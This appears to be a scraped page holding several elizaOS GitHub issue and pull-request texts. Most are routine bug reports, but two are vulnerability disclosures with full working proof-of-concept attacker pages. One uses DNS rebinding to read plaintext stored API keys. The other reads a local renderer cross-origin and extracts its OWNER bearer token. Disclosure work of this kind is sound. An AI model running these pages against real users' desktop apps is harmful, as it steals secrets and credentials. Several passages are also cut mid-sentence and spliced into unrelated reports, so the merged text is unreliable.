alls: 1\n\n/api/compat/agents/:id/suspend\nmalformed JSON:      HTTP 202, enqueueAgentSuspendOnce calls: 1\nschema-invalid JSON: HTTP 202, enqueueAgentSuspendOnce calls: 1\n\n/api/v1/apps/:id/deploy\nmalformed JSON:      HTTP 202, createDeployment calls: 1\n\n/api/v1/advertising/campaigns/:id/duplicate\nmalformed JSON:      HTTP 201, duplicateCampaign calls: 1\n\n/api/v1/payment-requests/:id/cancel\nmalformed JSON:      HTTP 200, payment cancel calls: 1\n\nfocused reproduction total: 7 passed, 0 failed, 14 assertions\n```\n\nThe four remaining listed routes have the same statically verified control\nflow: parse failure becomes `{}`, the local schema accepts `{}`, then the route\ninvokes its mutation service. They were not counted as executed evidence.\n\nAll temporary reproduction files were removed afterward and the contribution\nworktree is clean.\n\n**Expected behavior / acceptance**\n\nFor every retained affected route:\n\n- A genuinely absent, empty, or whitespace-only body keeps the route's existing\n  documented optional-body behavior.\n- A valid `{}` body keeps the same behavior.\n- Malformed or unreadable non-empty JSON returns a structured HTTP 400 before\n  the mutation service is invoked.\n- Syntactically valid but schema-invalid JSON returns HTTP 400; in particular,\n  the two suspend routes must stop replacing invalid `reason` values with the\n  default reason.\n- Regression tests assert both the response and an empty mutation call ledger\n  for malformed input, plus the intended bodyless behavior for each route.\n- Any shared parser/helper must preserve route-specific envelopes and must not\n  turn this into an unproved API-wide mechanical sweep.\n\nThis can be delivered in acceptance-ready slices if maintainers prefer, but the\nissue records the confirmed family so fixes are consolidated rather than\nrediscovered route by route.\n\n**Evidence / reproduction proof**\n\n- Screenshots / recording: N/A — server-only API behavior with no rendered UI.\n- B with at most six decimals\".\n\nThe code union (`:37-44`) has no member for a key problem. The messages are right; the typed reason is wrong, which is the same shape as #32945 (a whole-cents amount reported as `AMOUNT_TOO_LARGE`). The repository error policy asks for an actionable `code`; an operator who branches on `CRYPTO_REFUND_INVALID_AMOUNT` and corrects the amount is chasing the wrong field for both key cases.\n\nConsumers: `git grep CRYPTO_REFUND_INVALID_AMOUNT` across `packages/` and `plugins/` finds only the service and its test. The operator script (`packages/cloud/scripts/admin/refund-crypto-payment.ts`) prints the thrown error, so it shows the code verbatim.\n\n**To Reproduce**\n\nOn `origin/develop` `27dec7b0c3`, Bun 1.3.14, against a PGlite database migrated with `bun run db:cloud:migrate` and holding no rows. A probe calls the real service with three keys (the third is well-formed, so it reaches the payment lookup):\n\n```\n$ DATABASE_URL=pglite://\u003cdir\u003e bun --conditions=eliza-source \u003cprobe\u003e.ts\n{\"refundKey\":\"k\",\"code\":\"CRYPTO_REFUND_INVALID_AMOUNT\",\"message\":\"Refund key is invalid\"}\n{\"refundKey\":\"bad key with spaces\",\"code\":\"CRYPTO_REFUND_INVALID_AMOUNT\",\"message\":\"Refund key is invalid\"}\n{\"refundKey\":\"support-ticket-0001\",\"code\":\"CRYPTO_REFUND_PAYMENT_NOT_FOUND\",\"message\":\"Crypto payment not found\"}\n```\n\nThe reuse case needs a settled payment; the service test's PGlite fixture reproduces it (refund once with key `support-ticket-3` for 2 USD, then again with the same key for 3 USD) and gets `CRYPTO_REFUND_INVALID_AMOUNT` from `:193-197`.\n\n**Expected behavior**\n\n- A malformed refund key gets its own code, for example `CRYPTO_REFUND_INVALID_KEY`, with the current message.\n- A refund key reused with a different amount gets its own code, for example `CRYPTO_REFUND_KEY_AMOUNT_MISMATCH`, with the current message and the `paymentId` context.\n- `CRYPTO_REFUND_INVALID_AMOUNT` stays for the amount check only. No message, ordering or ledger behaviour changes.\n\n**Screenshots / recording of the wrong behavior (required for anything visible)**\n\nN/A - a service error code with no rendered surface; the probe transcript above is the proof.\n\n**Evidence / reproduction proof**\n\n- [x] MP4 recording or JPG screenshots of the broken behavior: N/A - no visible surface; see the transcript.\n- [x] Backend logs and frontend console/network logs when relevant: the service's thrown code and message are in the transcript. N/A for frontend.\n- [x] Real-LLM trajectory when the bug involves agent/action/prompt/model behavior: N/A - no model, prompt or action is involved.\n- [x] Domain artifacts when relevant: the code and message pairs above, from the real service on a migrated PGlite database.\n\n**Additional context**\n\n- The operator script that surfaces these codes cannot currently start on `develop` (#33054); the probe called the service directly through the `@elizaos/cloud-shared` export.\n\n**Contribution provenance**\n\n\u003c!-- contribution-attribution:v1 --\u003e\n\u003c!-- attribution-row:ai-assistance --\u003e\n- AI assistance: `yes`\n\u003c!-- attribution-row:models --\u003e\n- Model(s) used: `anthropic/claude-fable-5-1`\n\u003c!-- attribution-row:client --\u003e\n- Agent tooling: `Claude Code`\n\u003c!-- attribution-row:skill-revision --\u003e\n- Skill path: `elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99:skills/contribute-to-eliza`\n\u003c!-- attribution-row:status --\u003e\n- Provenance status: `self-reported`\n\nAI provider/model: anthropic / claude-fable-5-1\nClient / agent tooling: Claude Code\nContribution skill revision: elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99:skills/contribute-to-eliza\nAttribution status: self-reported\n— [nxn-claude-code]\n\u003c!-- eliza-computer-attribution:v1 {\"provider\":\"anthropic\",\"model\":\"claude-fable-5-1\",\"client\":\"Claude Code\",\"skill_revision\":\"elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99:skills/contribute-to-eliza\"} --\u003e\n"])</script><script>self.__next_f.push([1,"17:T191e,"])</script><script>self.__next_f.push([1,"**Describe the bug**\n\n`/api/status`, `/api/health` and the WebSocket status payload report `canRespond: true` on two runtimes whose first turn cannot be served, because `computeCanRespond` counts the local-inference router as a text provider.\n\n- `computeCanRespond` (`packages/agent/src/api/health-routes.ts:468`) asks `hasTextGenerationHandler(runtime)`, which is satisfied by any registration on a text slot. The local-inference plugin registers `eliza-router` on every text slot (`plugins/plugin-local-inference/src/services/router-handler.ts`, `installRouterHandler`). The router serves nothing itself: it dispatches to the other registered handlers, and with none it throws `NoModelProviderConfiguredError` (`router-handler.ts:488-490`, \"No provider registered for TEXT_LARGE. Configure a cloud provider, enable local inference, or pair a device.\"). A runtime whose text slots hold only the router therefore reports `canRespond: true` while every turn fails. That shape is produced in practice: with `ELIZA_DEVICE_BRIDGE_ENABLED=1` and no device attached, `ensureLocalInferenceHandler` installs the router and returns before registering any text handler (`plugins/plugin-local-inference/src/runtime/ensure-local-inference-handler.ts:1784-1797`).\n- `isCloudTextModelUnavailable` (`health-routes.ts:640-644`) gates chat only when every provider registered for a missing Cloud model type is `elizaOSCloud`. On a host where the router sits beside Cloud alone, `providers` is `[\"eliza-router\", \"elizaOSCloud\"]`, so a positive catalog answer that the Cloud model is missing never gates chat, although the router's only candidate is that same Cloud handler.\n\n`readLocalTextModelReadiness` already leaves the router out of its registration filter (`health-routes.ts:500-506`, since #32953). The two checks above do not. The #32953 review recorded both as non-blocking findings; this issue is the follow-up.\n\n**To Reproduce**\n\nOn `origin/develop` `27dec7b0c3`, Bun 1.3.14, Node 24.15.0, a test that installs the production router on a real `AgentRuntime` and compares `canRespond` with what `useModel` does:\n\n```ts\nconst runtime = new AgentRuntime({ character: { name: \"Router only\", bio: [] } });\ninstallRouterHandler(runtime); // production router from plugin-local-inference\nawait expect(\n  runtime.useModel(ModelType.TEXT_LARGE, { prompt: \"first turn\" }),\n).rejects.toBeInstanceOf(NoModelProviderConfiguredError); // passes\nexpect(computeCanRespond(runtime, \"running\", null)).toBe(false); // fails: true\n```\n\n```ts\nconst runtime = await initializedRuntime(\"Router over Cloud\");\nruntime.registerModel(ModelType.TEXT_LARGE, noInference, \"elizaOSCloud\");\ninstallRouterHandler(runtime);\n// CLOUD_MODEL_REGISTRY service reports TEXT_LARGE as model_not_available\nexpect(computeCanRespond(runtime, \"running\", null)).toBe(false); // fails: true\n```\n\n```\n$ cd packages/agent \u0026\u0026 bunx vitest run test/response-readiness-router.test.ts   # develop health-routes.ts\n ❯ test/response-readiness-router.test.ts (6 tests | 2 failed)\n   × does not report a router with no provider behind it as able to respond\n   × gates a Cloud-only runtime behind the router when the catalog lacks the model\nAssertionError: expected true to be false // Object.is equality\nAssertionError: expected true to be false // Object.is equality\n```\n\nWithout the router, the same Cloud-only runtime is gated correctly, which the existing `local-model-readiness-http.test.ts` pins (\"preserves Cloud unknown, explicit unavailable, and fallback-provider behavior\").\n\n**Expected behavior**\n\n- A runtime whose text slots hold nothing but the router reports `canRespond: false`, the same as a runtime with no text handler at all.\n- A runtime with Cloud behind the router is gated by a positive catalog answer that the Cloud model is missing, the same as a Cloud-only runtime without the router.\n- A router over any real provider (local inference, Cloud, OpenAI, Ollama, a custom provider) keeps reporting `canRespond: true`.\n\n**Screenshots / recording of the wrong behavior (required for anything visible)**\n\nN/A - the defect is in the readiness JSON that the composer gate reads; the test transcript above is the proof. The visible effect is a composer that goes live on a host whose first turn then fails.\n\n**Evidence / reproduction proof**\n\n- [x] MP4 recording or JPG screenshots of the broken behavior: N/A - no rendered surface of its own; see the transcript.\n- [x] Backend logs and frontend console/network logs when relevant: the assertion output above; `useModel` rejects with `NoModelProviderConfiguredError` on the router-only runtime.\n- [x] Real-LLM trajectory when the bug involves agent/action/prompt/model behavior: N/A - no model is invoked; the router rejects before any provider.\n- [x] Domain artifacts when relevant: the registration table of the router-only runtime (`getModelRegistrations()` filtered to `TEXT_LARGE` gives `[\"eliza-router\"]`).\n\n**Additional context**\n\n- `hasTextGenerationHandler` lives in `plugins/plugin-assistant/src/services/message/trajectory-stages.ts:385-397` and uses `runtime.getModel(type)`, which returns the router's handler. The narrowest fix keeps that helper and adds a router-aware registration check in `health-routes.ts`, which already knows the router's provider name.\n- On a device-bridge host, the UI composer currently goes live while the device is still absent. After the fix it stays locked until a device or another provider registers, which matches what a turn would do.\n\n**Contribution provenance**\n\n\u003c!-- contribution-attribution:v1 --\u003e\n\u003c!-- attribution-row:ai-assistance --\u003e\n- AI assistance: `yes`\n\u003c!-- attribution-row:models --\u003e\n- Model(s) used: `anthropic/claude-fable-5-1`\n\u003c!-- attribution-row:cl n/docker-nodes/node-1/drain` with\n   `Content-Type: application/json` and the truncated body\n   `{\"deprovision\":`.\n3. Observe HTTP 200 and a call to `drainNode(\"node-1\", { deprovision: false })`.\n\nA deterministic Hono route harness against current `develop` reproduced the\nfailure:\n\n```text\nexpected status: 400\nreceived status: 200\ndrainNode calls: [[\"node-1\", {\"deprovision\": false}]]\n```\n\n**Expected behavior**\n\nMalformed or unreadable JSON must return HTTP 400 before the autoscaler is\ncalled. A genuinely bodyless request must remain valid and retain the current\n`deprovision: false` behavior.\n\n**Screenshots / recording of the wrong behavior (required for anything visible)**\n\nN/A - this is a server-only administrative API path with no rendered UI.\n\n**Evidence / reproduction proof**\n\n- [x] MP4 recording or JPG screenshots: N/A - no rendered visual surface.\n- [x] Backend logs: N/A - the route does not emit an application log for this\n      request; the real route response and mocked autoscaler call ledger are\n      included above.\n- [x] Frontend console/network logs: N/A - no frontend behavior changes.\n- [x] Real-LLM trajectory: N/A - no agent, prompt, provider, or model behavior.\n- [x] Domain artifacts: the route response and autoscaler invocation ledger\n      above capture the mutation boundary directly.\n\n**Additional context**\n\nNeighboring Docker-node create and update routes already reject malformed JSON\nwith HTTP 400. A repository and GitHub search found no open issue or pull\nrequest covering this drain-route failure.\n\nAI provider/model: openai / gpt-5.6-sol\nClient / agent tooling: Codex\nContribution skill revision: N/A - ordinary GitHub contribution without optional run evidence\nAttribution status: self-reported\n— [contributor]\n\u003c!-- eliza-computer-attribution:v1 {\"provider\":\"openai\",\"model\":\"gpt-5.6-sol\",\"client\":\"Codex\",\"skill_revision\":\"N/A - ordinary GitHub contribution without optional r gent API it spawned on `127.0.0.1:31337`. Before forwarding, it **strips the request's `Host` header** (treated as hop-by-hop) and rewrites it to the loopback target, while passing `Origin` / `Sec-Fetch-*` through. The proxy itself does not validate where a request comes from.\n2. The **agent API** treats every loopback peer as **OWNER, unconditionally** (`isTrustedLocalRequest`).\n\nAn attacker serves a page from a rebinding domain — e.g. `7f000001.\u003cattacker-ip-hex\u003e.rbndr.us`, which alternates A records between the attacker's IP and `127.0.0.1` (TTL 1s). Once the domain resolves to `127.0.0.1`, the attacker's page is **same-origin with the renderer server**, and its GETs flow through the proxy into the agent API: `Host` has been rewritten to loopback, a same-origin GET carries **no `Origin` header**, and `Sec-Fetch-Site` is `same-origin` — every loopback-trust condition is satisfied *legitimately*, so the request is authorized as **OWNER with zero credentials**.\n\nResult: any website can read **all GET endpoints** of the agent API, including:\n\n- `GET /api/secrets/inventory` — enumerates every stored secret (key / label / category / lastModified)\n- `GET /api/secrets/inventory/:key` — returns the secret's **current value in plaintext** (verified: `{\"ok\":true,\"value\":\"sk-…\",\"source\":\"bare\"}`) — e.g. LLM provider API keys\n- `GET /api/secrets` — directory with isSet status + masked values (`maskValue`) for cross-checking\n- `/api/agents`, `/api/plugins`, `/api/rooms`, … — all business data\n\n## Environment\n\n- `@elizaos/app` 2.0.3-beta.7 (commit `876317fb`), Windows 11, default local configuration\n- Attacker needs any domain that can alternate A records (the free `rbndr.us` service works) and an HTTP server on the **same port as the victim's renderer** (default 5174)\n\n## Root cause\n\n**Renderer proxy strips/rewrites Host** — `packages/app/platforms/electrobun/src/renderer-api-proxy.ts:74-92`:\n\n```ts\nconst HOP_BY_HOP_HEADERS = new Set([\n  \"connection\",\n  \"keep-alive\",\n  \"host\",   // ← the request's Host is dropped, then rewritten to the loopback proxy target\n  ...\n]);\n```\n\n**Agent API: loopback peer = unconditional OWNER** — `packages/agent/src/api/server-helpers-auth.ts:348-364`:\n\n```ts\nif (isTrustedLocalRequest(req)) return true;   // loopback peer → OWNER, no credentials\n```\n\n`isTrustedLocalRequest` (`packages/core/src/security/loopback-trust.ts:374-416`) bases the decision entirely on request properties: loopback TCP peer, no proxy-client-IP headers, loopback `Host`, `Sec-Fetch-Site` ∈ {missing, same-origin, none}, `Origin` absent-or-trusted (`isTrustedLocalOrigin`, :347-360, passes when `Origin` is missing). This correctly blocks **direct** cross-site requests to `:31337` (`Sec-Fetch-Site: cross-site` → 403) — but after a rebind, the browser's request *is* same-origin, so it passes.\n\nThe secrets endpoints are gated on OWNER only — e.g. `packages/app/src/api/secrets-inventory-routes.ts:124` (`ensureRouteMinRole(..., \"OWNER\")`), `packages/agent/src/api/plugin-management-routes.ts:280-291` — and a rebound request **is** OWNER. (Additionally, `packages/agent/src/api/media-runtime.ts:92-115` marks media routes `public: true`.)\n\nAttack chain:\n\n```\nattacker domain (A record → attacker) serves the malicious page\n  → TTL expires, domain resolves to 127.0.0.1 (rbndr.us alternates both IPs, TTL 1s)\n  → page is now same-origin with the renderer (127.0.0.1:5174)\n  → same-origin GET fetch(\"/api/secrets/inventory/\u003ckey\u003e\")\n  → renderer proxy strips Host, forwards → agent API (127.0.0.1:31337)\n  → loopback peer + rewritten Host + GET without Origin → trusted → OWNER\n  → 200 {\"ok\":true,\"value\":\"sk-…\"} — plaintext API key, readable same-origin\n```\n\n## Steps to reproduce\n\n\u003e DNS rebinding requires the attacker page to be served on the **same port** the victim's renderer listens on (default 5174, from any non-loopback IP — a second machine, or another NIC/LAN IP on the same machine).\n\n1. **Attacker side:** save the PoC below as `poc.html` and serve it on port 5174 (`python -m http.server 5174`).\n2. Build the rebinding domain: `7f000001.\u003cattacker-ip-hex\u003e.rbndr.us` — e.g. attacker `192.168.1.10` → hex `c0a8010a` → `7f000001.c0a8010a.rbndr.us` (`7f000001` = 127.0.0.1).\n3. **Victim side:** start the desktop app (default config), browse to `http://7f000001.c0a8010a.rbndr.us:5174/poc.html`, click \"Start\".\n4. The page polls a relative GET every 900 ms (≤90 tries). While DNS points at the attacker it just gets the PoC page back (or 404); once it flips to `127.0.0.1` you get `REBIND HIT`, and the page reads `/api/secrets/inventory`, `/api/secrets/inventory/\u003ckey\u003e` (plaintext), `/api/agents`, `/api/plugins`, `/api/rooms` — all HTTP 200, bodies fully readable (same-origin).\n\nMinimal PoC (any page on the rebinding domain, after the DNS flip):\n\n```js\nconst keys = await (await fetch(\"/api/secrets/inventory\", { cache: \"no-store\" })).json(); // enumerate stored secrets\nconst r = await fetch(\"/api/secrets/inventory/ANTHROPIC_API_KEY\", { cache: \"no-store\" }); // same-origin GET, no Origin header\nconst data = await r.json(); // {\"ok\":true,\"value\":\"sk-…\",\"source\":\"bare\"} — plaintext API key\n```\n\nSelf-contained PoC page:\n\n```html\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n\u003chead\u003e\u003cmeta charset=\"UTF-8\"\u003e\u003ctitle\u003eattacker rebind page\u003c/title\u003e\u003c/head\u003e\n\u003cbody style=\"background:#0d1117;color:#c9d1d9;font-family:Consolas,monospace;padding:24px\"\u003e\n\u003ch2\u003eElizaOS Desktop — DNS rebinding unauthorized-read PoC (this page is the \"attacker website\")\u003c/h2\u003e\n\u003cp\u003eTarget endpoint:\n\u003cselect id=\"target\"\u003e\n  \u003coption value=\"/api/secrets/inventory/ANTHROPIC_API_KEY\"\u003e/api/secrets/inventory/:key (plaintext API key)\u003c/option\u003e\n  \u003coption value=\"/api/secrets/inventory\"\u003e/api/secrets/inventory (enumerate secrets)\u003c/option\u003e\n  \u003coption value=\"/api/secrets\"\u003e/api/secrets (directory: isSet + masked values)\u003c/option\u003e\n  \u003coption value=\"/api/agents\"\u003e/api/agents\u003c/option\u003e\n  \u003coption value=\"/api/plugins\"\u003e/api/plugins\u003c/option\u003e\n  \u003coption value=\"/api/rooms\"\u003e/api/rooms\u003c/option\u003e\n\u003c/select\u003e\n\u003cbutton onclick=\"rebind()\"\u003eStart DNS rebinding unauthorized read\u003c/button\u003e\u003c/p\u003e\n\u003cpre id=\"log\" style=\"background:#010409;border:1px solid #30363d;padding:12px;min-height:160px\"\u003e\u003c/pre\u003e\n\u003cscript\u003e\nconst log = (m, c) =\u003e {\n  const d = document.createElement('div');\n  d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + m;\n  d.style.color = c || '#c9d1d9';\n  document.getElementById('log').appendChild(d);\n};\nlet scanning = false;\nasync function rebind() {\n  if (scanning) return;\n  if (location.protocol === 'file:') { log('[x] Open this page over http:// via the rbndr domain (file:// cannot rebind)', '#ff7b72'); return; }\n  if (/^(127\\.|localhost|\\[::1\\])/.test(location.hostname))\n    log('[!] Warning: you are on a loopback hostname — a same-origin read is not evidence; use the rbndr domain', '#d29922');\n  const target = document.getElementById('target').value;\n  scanning = true;\n  log('[*] Page origin: ' + location.origin + ' (the domain alternates attacker-IP \u003c-\u003e 127.0.0.1, TTL 1s)', '#8b949e');\n  let hit = false;\n  for (let i = 1; i \u003c= 90 \u0026\u0026 !hit; i++) {\n    try {\n      const r = await fetch(target, { cache: 'no-store', referrerPolicy: 'no-referrer' });\n      const body = await r.text();\n      if (r.status === 200 \u0026\u0026 body.length \u003e 0 \u0026\u0026 !/attacker rebind page/.test(body)) {\n        // response is no longer this PoC itself (the attacker side serves this page) -\u003e rebound to 127.0.0.1\n        hit = true;\n        log('[*] REBIND HIT @ try ' + i + ': ' + target + ' -\u003e HTTP ' + r.status + ' (now same-origin with 127.0.0.1:' + location.port + ')', '#ff7b72');\n        log('[+] First 500 bytes of the response:', '#3fb950');\n        log('    ' + body.slice(0, 500), '#8b949e');\n        if (target.indexOf('/api/secrets/inventory/') === 0 \u0026\u0026 /\"value\"\\s*:/.test(body))\n          log('[*] Plaintext API key read without authorization — ' + body, '#ff7b72');\n        log('[*] Impact: a page on the attacker domain reads agent API GET data as OWNER, with no credentials', '#ff7b72');\n      } else {\n        log('[-] try ' + i + ': HTTP ' + r.status + ' (DNS currently on the attacker side / got the PoC page itself)', '#8b949e');\n      }\n    } catch (e) {\n      log('[-] try ' + i + ': network error (DNS currently on the attacker side, or connection refused)', '#8b949e');\n    }\n    await new Promise(s =\u003e setTimeout(s, 900));\n  }\n  if (!hit) log('[x] No hit in 90 tries. Check: do the attacker server and the victim renderer use the same port (both 5174)? Is the rbndr domain correct?', '#ff7b72');\n  scanning = false;\n}\n\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n## Negative control (what already works)\n\n- From an ordinary website: `fetch(\"http://127.0.0.1:5174/api/...\")` → the browser attaches `Sec-Fetch-Site: cross-site` → the agent API returns **403**.\n- Direct request to `:31337` with a stolen Bearer token → **403**.\n- Only the rebinding path succeeds without credentials — the agent API does defend against direct cross-site access; the gap is the **renderer proxy chain**.\n\n## Impact (and honest scope)\n\n- Through this path a browser obtains **read-only OWNER access**: all GET endpoints, including stored secrets in plaintext.\n- **Writes are blocked**: POST/PUT/DELETE from the browser carry `Origin` → 403. No write/RCE from the browser via this issue alone.\n- Plaintext reads only cover secrets the victim has actually reads the full HTML, and extracts the OWNER token with a regex. Zero interaction, no dialogs, completely silent — the app's highest-privilege credential is handed to an arbitrary website.\n\n## Environment\n\n- `@elizaos/app` 2.0.3-beta.7 (commit `876317fb`), Windows 11, default local configuration (no special settings)\n\n## Root cause\n\n`packages/app/platforms/electrobun/src/index.ts` — static-file handling of the renderer server:\n\n```ts\n// index.ts:915-933 — HTML branch\nif (mimeExt === \".html\" || filePath.endsWith(\"index.html\")) {\n    const html = apiBaseOwner.injectIntoHtml(content.toString(\"utf8\"));  // :925 — injects apiToken + apiBase into the page\n    return new Response(html, {\n        headers: {\n            \"Content-Type\": \"text/html; charset=utf-8\",\n            \"Access-Control-Allow-Origin\": \"*\",                           // :929 — any origin may read this\n            \"Cache-Control\": \"public, max-age=0, must-revalidate\",\n        },\n    });\n}\n```\n\n```ts\n// index.ts:934-937 — all other static assets\nconst headers: Record\u003cstring, string\u003e = {\n    \"Content-Type\": getRendererAssetContentType(mimeExt),\n    \"Access-Control-Allow-Origin\": \"*\",                                   // :936\n    ...\n};\n```\n\nEither flaw alone would be harmless (no token embedded → nothing to steal; no `ACAO: *` → body unreadable cross-origin). Together, the OWNER credential leaves the victim's machine into the attacker's page context.\n\n## Steps to reproduce\n\n1. Start the desktop app (default config). The renderer listens on `127.0.0.1:5174`.\n2. Open any other web page (any http/https origin — even `file://` works, which is convenient for verification) and run this from the browser console:\n\n```js\nconst r = await fetch(\"http://127.0.0.1:5174/\", { cache: \"no-store\" });\nconst html = await r.text();\nconsole.log(r.headers.get(\"access-control-allow-origin\")); // \"*\"  (cross-origin read allowed)\nconsole.log(html.match(/apiToken:\"([0-9a-fA-F]+)\"/)[1]);   // the OWNER-level Bearer token\nconsole.log(html.match(/apiBase:\"([^\"]+)\"/)[1]);           // e.g. http://127.0.0.1:31337\n```\n\n3. The console prints the OWNER token.\n\nSelf-contained attacker page (save as `.html`, open in a browser on the victim machine, click the button):\n\n```html\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n\u003chead\u003e\u003cmeta charset=\"UTF-8\"\u003e\u003ctitle\u003eattacker page\u003c/title\u003e\u003c/head\u003e\n\u003cbody style=\"background:#0d1117;color:#c9d1d9;font-family:Consolas,monospace;padding:24px\"\u003e\n\u003ch2\u003eElizaOS Desktop — cross-origin OWNER token theft PoC (this page is the \"attacker website\")\u003c/h2\u003e\n\u003cp\u003eRenderer port (default 5174): \u003cinput id=\"port\" value=\"5174\" style=\"width:80px\"\u003e\n\u003cbutton onclick=\"steal()\"\u003eSteal OWNER token (cross-origin)\u003c/button\u003e\u003c/p\u003e\n\u003cpre id=\"log\" style=\"background:#010409;border:1px solid #30363d;padding:12px;min-height:120px\"\u003e\u003c/pre\u003e\n\u003cscript\u003e\nconst log = (m, c) =\u003e {\n  const d = document.createElement('div');\n  d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + m;\n  d.style.color = c || '#c9d1d9';\n  document.getElementById('log').appendChild(d);\n};\nasync function steal() {\n  const port = document.getElementById('port').value.trim() || '5174';\n  log('[*] Target: http://127.0.0.1:' + port + '/  (plain GET, no preflight, any origin may send it)', '#8b949e');\n  try {\n    const r = await fetch('http://127.0.0.1:' + port + '/', { cache: 'no-store' });\n    log('[+] HTTP ' + r.status, '#3fb950');\n    const acao = r.headers.get('access-control-allow-origin');\n    log(acao === null ? '[-] No ACAO header (this port may not be the renderer)'\n                      : '[+] Access-Control-Allow-Origin: ' + acao, acao === '*' ? '#ffa657' : '#d29922');\n    const html = await r.text();\n    log('[+] Cross-origin body read succeeded, ' + html.length + ' bytes', '#3fb950');\n    const tk = html.match(/apiToken:\"([0-9a-fA-F]+)\"/);\n    const ab = html.match(/apiBase:\"([^\"]+)\"/);\n    if (tk) log('[+] Stolen OWNER Bearer token: ' + tk[1], '#ffa657');\n    if (ab) log('[+] apiBase: ' + ab[1], '#ffa657');\n    if (tk \u0026\u0026 ab) log('[*] Impact: a malicious website has obtained the agent API OWNER credential with zero interaction', '#ff7b72');\n  } catch (e) {\n    log('[-] Request failed: ' + e.message, '#ff7b72');\n  }\n}\n\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n## Expected / actual\n\n- **Expected:** an external origin cannot read the local renderer's responses, and the OWNER token is never exposed to web content.\n- **Actual:** `ACAO: *` lets any origin read the index HTML, which contains the OWNER Bearer token in plaintext.\n\n## Impact (and honest scope)\n\n- The agent API's **OWNER credential itself is exfiltrated** to any website the user visits — zero interaction beyond opening a page.\n- Directly replaying **write** requests (POST/PUT) from the browser with the stolen token is rejected with 403: the agent API's loopback-trust check refuses requests carrying an untrusted `Origin` header (`packages/core/src/security/loopback-trust.ts:347-416`). The damage here is the credential leaving the machine, plus chaining with any local process or other issues — a local process holding this token can call the full API as OWNER.\n- Chrome's Local Network Access (LNA), if enforced, would block page→127.0.0.1 requests; default Chrome/Firefox today are affected.\n- Not applicable in external/cloud connection mode (no `apiToken` embedded there).\n\n## Suggested fix\n\n1. **Remove `Access-Control-Allow-Origin: *`** from static responses (`index.ts:929`, `index.ts:936`). The desktop UI does not need to be readable by arbitrary web origins.\n2. **Don't embed the long-lived OWNER token in the HTML** (`injectIntoHtml`): deliver it via one-time runtime IPC, or use short-lived per-session credentials bound to the app's own processes.\n3. If the UI must be served over HTTP, put an **Origin allowlist** on the renderer server (app protocol / loopback same-origin only)."])</script><script>self.__next_f.push([1,"1d:Tee6,"])</script><script>self.__next_f.push([1,"Agent clients need durable, owner-bound workflows and reviewed device operations that survive interruptions, reconnects and process restarts. This change adds generic runtime contracts and persistence for those flows, including managed Cloud Google delegation, hosted results and selected Maps reads.\n\n- Durable workflow authoring, validation, approval receipts, lifecycle changes and hosted delivery retain explicit approval and owner boundaries. Generic approval presentation is authoritative; legacy metadata remains a compatibility reader with downgrade rejection.\n- Device actions bind proposals, approval, claim and immutable receipts to authenticated owner, agent and device enrollment. Selected Maps reads require negotiated capability and matching target identity; replay retrieves the bounded historical result without a new device read.\n- Managed Cloud owner configuration and Google delegation provide identity and Gmail/Calendar access boundaries with server-side credentials and scope checks.\n- Action discovery retains umbrella actions when a resource-specific alias matches, preserving role and context eligibility.\n- Workflow mutation replies carry canonical receipts from the actual committed definition. Cancellation provenance is captured under the row lock, with per-service workflow control serialization. Submission, cancellation requests and pending device approvals cannot serve as proof that the requested operation completed. Pending workflow widgets retain their callback delivery.\n\nValidation at prior head 252152eaa0352fd26f4824371e967bbf4e828bfd:\n\n- Focused workflow SQL/worker/settlement/evaluator/parser checks: 7 tests and 243 assertions passed; workf on and test-inclusive typechecks and formatting checks pass. Full exact-head qualification and live provider/native acceptance are pending.\n"])</script><script>self.__next_f.push([1,"1e:Tb2e,"])</script><script>self.__next_f.push([1,"Mobile resident hosts need authenticated sessions, durable workflow workers that survive a parent restart without repeating uncertain effects, and reviewed device actions. This change composes direct route dispatch, owner sessions, shared compiler/dependency artifact production, canonical workflow reconciliation, approved Workflows navigation and Android Clock handoffs.\n\nWorkers reserve a durable generation before importing approved source. POSIX uses private sockets; Windows uses protected named pipes, SID-bound native handles and immutable source publication. Windows workers load trusted built-in PowerShell modules and detach from the parent while retaining RPC pipes. Android recovery authenticates surviving workers and rechecks detached-agent liveness before admitting a new generation. Unproven ownership and interrupted effects remain unknown.\n\nClock proposals require the enrolled clock.handoff.v1 capability, explicit device review and canonical claim/receipt handling. Set operations bind hour/minute to the current phone timezone. Strict typed receipts distinguish opened, unavailable, denied, failed and unknown; opened establishes only the Clock handoff, never alarm creation or ringing. Date, recurrence and DST-fold selection are outside this handoff contract.\n\nValidation:\n\n- Current head 28ee31f8fc69cb3610aa92e6ae2601c496419d03: owning HTTP/PGlite approval, claim, receipt and replay lifecycle passes; assistant typecheck and package lint pass. Full bun run verify passes in 758.3 seconds with all 29,825 source files unchanged.\n- Clock coverage includes all five capability tokens, malformed/duplicate capability rejection, current-message timezone propagation, strict outcome binding, preapproval rejection and no duplicate clai  (first root-postinstall link, wired in `package.json`) now enforces one contract on both Bun processes an install has:\n\n- **Installer** (the binary in `npm_execpath` that resolved dependencies and wrote `bun.lock`): identified by executing it with a Bun-only eval probe; a missing `npm_execpath`, an unexecutable path, or a non-Bun answer fails the install closed.\n- **Postinstall runtime** (the `bun` resolved from `PATH` that runs the patch/build chain): checked via `process.versions.bun` as before, still enforced — its `Bun.build` output differs across versions.\n- The pin is an exact release identity from `.github/ci-bun-version.json`. The previous numeric-triple comparison was dead code (byte-equal text implies equal triples, so exact text equality alone decided — the surviving review mutant proved it), and its \"string comparison would admit 1.4.10\" rationale described a comparison the code never performed. The decision is now exact text equality on a parsed concrete release, which rejects `1.4.10`, `1.4.20`, `1.4.2-rc.1`, and `1.4.2+d1632b2` against a `1.4.2` pin.\n- **Claims match behavior**: the failure output states that the guard fires *after* dependency resolution, that `bun.lock` may have been rewritten (`git checkout -- bun.lock` restores it), and leads with a platform-neutral remediation (official installer with `bun-v\u003cpin\u003e`; Windows release download); `bootstrap-linux-dev.sh` is labeled Linux-only.\n- `--no-installer-context` is the explicit manual mode: it verifies only the running Bun and its pass output discloses that no installer was verified. Install-context runs 